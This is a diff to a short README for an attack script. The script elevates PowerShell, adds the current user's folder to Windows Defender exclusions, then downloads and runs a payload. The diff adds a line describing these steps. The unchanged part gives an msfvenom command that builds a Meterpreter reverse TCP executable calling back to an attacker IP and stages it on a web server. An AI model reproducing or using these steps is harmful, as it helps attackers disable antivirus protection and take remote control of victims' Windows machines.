@@ -1,6 +1,8 @@
 Windows Defender ExclusionPath + ReverseShell
 =============================================
 
+This scrip will run PowerShell as administrator privilege and add directory of current User into Microsoft Windows Defender Exclusion. Then PowerShell will download payload file and run the payload. Last, exit the PowerShell.
+
 1. Create payload using msfvenom in kali linux:
 > $ msfvenom -p windows//x64/meterpreter/reverse_tcp lhost=attacker_IP lport=port -f exe -o /var/www/html/windowsx64.exe
   
